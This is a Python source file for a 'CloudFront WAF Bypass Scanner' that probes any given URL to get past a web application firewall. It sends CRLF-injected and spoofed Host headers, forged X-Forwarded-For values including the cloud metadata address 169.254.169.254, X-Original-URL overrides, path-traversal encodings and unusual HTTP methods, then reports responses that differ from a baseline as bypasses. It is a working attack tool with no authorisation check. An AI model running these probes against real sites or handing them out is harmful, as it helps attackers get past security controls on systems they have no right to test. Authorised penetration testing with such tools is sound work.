"""
CloudFront WAF Bypass Scanner with Smart Detection
"""
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import time
import hashlib


class CloudFrontBypasser:
    def __init__(self, target, threads=10, delay=0.2):
        self.target = target.rstrip('/')
        self.threads = threads
        self.delay = delay
        self.results = []
        
        # Baseline tracking
        self._baseline_size = None
        self._baseline_hash = None
        self._baseline_status = None
        self._baseline_headers = {}
        
        # Parse target
        parsed = urlparse(self.target)
        self.domain = parsed.netloc
        self.scheme = parsed.scheme
        
    def scan(self):
        """Run all bypass techniques"""
        print(f"[*] Scanning {self.target}")
        
        # Establish baseline first
        print("[*] Establishing baseline...")
        baseline = self._get_baseline()
        if not baseline:
            print("[!] Failed to establish baseline - target may be down")
            return []
        
        self._baseline_size = len(baseline.content)
        self._baseline_hash = hashlib.md5(baseline.content).hexdigest()
        self._baseline_status = baseline.status_code
        self._baseline_headers = dict(baseline.headers)
        
        print(f"[+] Baseline: {self._baseline_status} | Size: {self._baseline_size} bytes")
        print(f"[*] Testing bypass techniques...\n")
        
        techniques = [
            self._test_host_header_injection,
            self._test_x_forwarded_for,
            self._test_x_forwarded_host,
            self._test_x_original_url,
            self._test_cache_control,
            self._test_encoding_bypass,
            self._test_method_bypass,
            self._test_content_type_bypass,
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(technique) for technique in techniques]
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.results.extend(result)
                except Exception as e:
                    pass
        
        return self.results
    
    def _get_baseline(self):
        """Get baseline response for comparison"""
        try:
            resp = requests.get(self.target, timeout=5, allow_redirects=False)
            return resp
        except Exception as e:
            return None
    
    def _test_request(self, headers=None, method='GET', path='/'):
        """Test a single request configuration"""
        url = f"{self.target}{path}"
        
        try:
            if method == 'GET':
                resp = requests.get(url, headers=headers, timeout=5, allow_redirects=False)
            elif method == 'POST':
                resp = requests.post(url, headers=headers, timeout=5, allow_redirects=False)
            elif method == 'HEAD':
                resp = requests.head(url, headers=headers, timeout=5, allow_redirects=False)
            else:
                resp = requests.request(method, url, headers=headers, timeout=5, allow_redirects=False)
            
            time.sleep(self.delay)
            
            # Check if bypass succeeded
            bypass_result = self._is_bypass(resp)
            
            return {
                'bypass': bypass_result['bypass'],
                'status': resp.status_code,
                'headers': headers or {},
                'method': method,
                'path': path,
                'size': len(resp.content),
                'technique': headers.get('X-Technique', 'Unknown') if headers else 'Unknown',
                'reason': bypass_result['reason'],
                'severity': bypass_result['severity']
            }
        except Exception as e:
            return None
    
    def _is_bypass(self, response):
        """Determine if response indicates WAF bypass with detailed reasoning"""
        
        if self._baseline_size is None:
            return {'bypass': False, 'reason': 'No baseline', 'severity': 'INFO'}
        
        # Ignore error responses (4xx, 5xx) - these are NOT bypasses
        if response.status_code >= 400:
            return {'bypass': False, 'reason': f'Blocked: {response.status_code}', 'severity': 'INFO'}
        
        current_size = len(response.content)
        current_hash = hashlib.md5(response.content).hexdigest()
        size_diff = abs(current_size - self._baseline_size)
        size_diff_percent = (size_diff / self._baseline_size) * 100 if self._baseline_size > 0 else 0
        
        # CRITICAL: Status code changed from blocked to allowed
        if self._baseline_status in [403, 401] and response.status_code == 200:
            return {
                'bypass': True,
                'reason': f'Authentication bypass: {self._baseline_status} → {response.status_code}',
                'severity': 'CRITICAL'
            }
        
        # HIGH: Significant size difference (different content)
        if size_diff_percent > 10:
            return {
                'bypass': True,
                'reason': f'Content difference: {size_diff} bytes ({size_diff_percent:.1f}% change)',
                'severity': 'HIGH'
            }
        
        # HIGH: Different content hash (even if size similar)
        if current_hash != self._baseline_hash and size_diff > 100:
            return {
                'bypass': True,
                'reason': 'Different content returned (hash mismatch)',
                'severity': 'HIGH'
            }
        
        # CRITICAL: Backend error exposed
        error_indicators = [
            ('exception', 'CRITICAL'),
            ('traceback', 'CRITICAL'),
            ('stack trace', 'CRITICAL'),
            ('sql syntax', 'CRITICAL'),
            ('mysql_', 'CRITICAL'),
            ('postgresql', 'CRITICAL'),
            ('ora-', 'CRITICAL'),
            ('internal server error', 'HIGH'),
            ('500 internal', 'HIGH'),
            ('apache/', 'MEDIUM'),
            ('nginx/', 'MEDIUM'),
            ('iis/', 'MEDIUM'),
            ('tomcat/', 'MEDIUM'),
            ('debug mode', 'HIGH'),
            ('fatal error', 'HIGH'),
            ('warning:', 'MEDIUM'),
        ]
        
        body_lower = response.text.lower()
        for indicator, severity in error_indicators:
            if indicator in body_lower:
                return {
                    'bypass': True,
                    'reason': f'Backend exposed: "{indicator}" found in response',
                    'severity': severity
                }
        
        # MEDIUM: Backend server header exposed
        if 'server' in response.headers:
            server = response.headers['server'].lower()
            backend_servers = ['apache', 'nginx', 'iis', 'tomcat', 'jetty', 'gunicorn', 'uwsgi']
            for backend in backend_servers:
                if backend in server and backend not in self._baseline_headers.get('server', '').lower():
                    return {
                        'bypass': True,
                        'reason': f'Backend server exposed: {response.headers["server"]}',
                        'severity': 'MEDIUM'
                    }
        
        # MEDIUM: X-Powered-By header exposed
        if 'x-powered-by' in response.headers:
            if 'x-powered-by' not in self._baseline_headers:
                return {
                    'bypass': True,
                    'reason': f'Backend tech exposed: {response.headers["x-powered-by"]}',
                    'severity': 'MEDIUM'
                }
        
        # MEDIUM: Different redirect location
        if response.status_code in [301, 302, 307, 308]:
            baseline_location = self._baseline_headers.get('location', '')
            current_location = response.headers.get('location', '')
            if current_location and current_location != baseline_location:
                return {
                    'bypass': True,
                    'reason': f'Different redirect: {current_location}',
                    'severity': 'MEDIUM'
                }
        
        # No bypass detected
        return {'bypass': False, 'reason': 'Response identical to baseline', 'severity': 'INFO'}
    
    def _test_host_header_injection(self):
        """Test Host header manipulation"""
        results = []
        
        variations = [
            {'Host': 'localhost'},
            {'Host': '127.0.0.1'},
            {'Host': f'{self.domain}:80'},
            {'Host': f'{self.domain}:443'},
            {'Host': f'evil.com\r\nX-Injected: true'},
        ]
        
        for headers in variations:
            headers['X-Technique'] = f'Host Header Injection: {headers["Host"]}'
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_x_forwarded_for(self):
        """Test X-Forwarded-For bypass"""
        results = []
        
        ips = ['127.0.0.1', '0.0.0.0', '10.0.0.1', '192.168.1.1', '169.254.169.254']
        
        for ip in ips:
            headers = {
                'X-Forwarded-For': ip,
                'X-Technique': f'X-Forwarded-For: {ip}'
            }
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_x_forwarded_host(self):
        """Test X-Forwarded-Host bypass"""
        results = []
        
        hosts = ['localhost', '127.0.0.1', self.domain, 'evil.com']
        
        for host in hosts:
            headers = {
                'X-Forwarded-Host': host,
                'X-Technique': f'X-Forwarded-Host: {host}'
            }
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_x_original_url(self):
        """Test X-Original-URL bypass"""
        results = []
        
        paths = ['/', '/admin', '/%2e%2e/', '/..;/']
        
        for path in paths:
            headers = {
                'X-Original-URL': path,
                'X-Technique': f'X-Original-URL: {path}'
            }
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_cache_control(self):
        """Test Cache-Control bypass"""
        results = []
        
        cache_headers = [
            {'Cache-Control': 'no-cache'},
            {'Cache-Control': 'no-store'},
            {'Cache-Control': 'max-age=0'},
            {'Pragma': 'no-cache'},
        ]
        
        for headers in cache_headers:
            headers['X-Technique'] = f'Cache-Control: {list(headers.values())[0]}'
            result = self._test_request(headers)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_encoding_bypass(self):
        """Test encoding bypass"""
        results = []
        
        paths = [
            '/%2e/',
            '/..%2f',
            '/%252e%252e/',
            '/%u002e%u002e/',
        ]
        
        for path in paths:
            headers = {'X-Technique': f'Path Encoding: {path}'}
            result = self._test_request(headers, path=path)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_method_bypass(self):
        """Test HTTP method bypass"""
        results = []
        
        methods = ['POST', 'OPTIONS', 'TRACE', 'TRACK', 'PUT', 'DELETE']
        
        for method in methods:
            headers = {'X-Technique': f'HTTP Method: {method}'}
            result = self._test_request(headers, method=method)
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_content_type_bypass(self):
        """Test Content-Type bypass"""
        results = []
        
        content_types = [
            'application/json',
            'application/xml',
            'text/plain',
            'multipart/form-data',
        ]
        
        for ct in content_types:
            headers = {
                'Content-Type': ct,
                'X-Technique': f'Content-Type: {ct}'
            }
            result = self._test_request(headers, method='POST')
            if result and result['bypass']:
                results.append(result)
                print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results


def main():
    """Standalone scanner"""
    from argparse import ArgumentParser
    import json
    
    parser = ArgumentParser(description='CloudFront WAF Bypass Scanner')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-d', '--delay', type=float, default=0.2, help='Delay between requests')
    parser.add_argument('-o', '--output', help='Output JSON file')
    args = parser.parse_args()
    
    scanner = CloudFrontBypasser(args.target, args.threads, args.delay)
    results = scanner.scan()
    
    print(f"\n{'='*60}")
    print(f"[+] Scan Complete: Found {len(results)} actual bypasses")
    print(f"{'='*60}\n")
    
    if results:
        # Group by severity
        critical = [r for r in results if r['severity'] == 'CRITICAL']
        high = [r for r in results if r['severity'] == 'HIGH']
        medium = [r for r in results if r['severity'] == 'MEDIUM']
        
        if critical:
            print(f"🔴 CRITICAL ({len(critical)}):")
            for r in critical:
                print(f"  - {r['technique']}")
                print(f"    Reason: {r['reason']}")
        
        if high:
            print(f"\n🟠 HIGH ({len(high)}):")
            for r in high:
                print(f"  - {r['technique']}")
                print(f"    Reason: {r['reason']}")
        
        if medium:
            print(f"\n🟡 MEDIUM ({len(medium)}):")
            for r in medium:
                print(f"  - {r['technique']}")
                print(f"    Reason: {r['reason']}")
    else:
        print("✅ No bypasses found - target is properly protected")
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n[+] Results saved to {args.output}")


if __name__ == '__main__':
    main()